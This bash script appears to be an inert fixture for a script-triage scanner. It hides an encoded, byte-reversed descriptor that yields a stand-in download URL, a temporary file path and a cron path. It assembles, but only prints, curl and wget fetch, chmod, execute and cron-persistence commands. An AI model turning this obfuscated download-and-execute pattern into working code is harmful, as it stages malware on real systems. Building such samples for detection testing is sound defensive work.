#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_7fc5d0d0='NGJlYzRjY2E2MC1ldGFkcHUvZC5ub3JjL2N0ZS89aHRhcF9ub3JjfGVjaXZyZXMuNGJlYzRjY2E2MC1ldGFkcHU9ZW1hbl9lY2l2cmVzfG0tZW1hbnU9ZWJvcnBfaGNyY''Xw0YmVjNGNjYTYwLWVnYXRzLi9laGNhYy1zc2VydG51aC9wbXQvPWh0YXBfZWxpZnw0YmVjNGNjYTYwL2JhTHNzZXJ0bnVIPXRuZWdhX3Jlc3V8aHMuYzk0ZTQwYmYvZG''lsYXZuaS5lbHBtYXhlLjRiZWM0Y2NhNjAvLzpzcHR0aD1scnV8NGJlYzRjY2E2MC1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3w1PXRudW9jX2VnYXRzfGtjYWJsbGFmX3l0aWx''pdHVfaXRsdW09cmV0cGFkYXxzc2Vjb3JwX2hjdGFwc2lkLGVkb21fZWduYWhjLGVsaWZfZXRpcncsZXRvbWVyX2VyaXVxY2EsdHNvaF9lbGlmb3JwPXNwZXRzfDE9dg=='
readonly Codec_7fc5d0d0='base64_chunks|reverse_bytes|'

Load_7fc5d0d0() {
  item1=()
  local item6
  while read -r item6; do [[ -n "$item6" ]] && item1+=("$item6"); done < <(printf '%s' "${Material_7fc5d0d0}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_7fc5d0d0() {
  item2=()
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2[${#item1[@]}-1-item5]="${item1[item5]}"
  done
}

Recover_7fc5d0d0() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_7fc5d0d0
  item8=0; while ((item8 < 1)); do Decode_7fc5d0d0; ((item8+=1)); done
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_7fc5d0d0() { Recover_7fc5d0d0; }

Plan_7fc5d0d0() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_7fc5d0d0)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_7fc5d0d0; fi
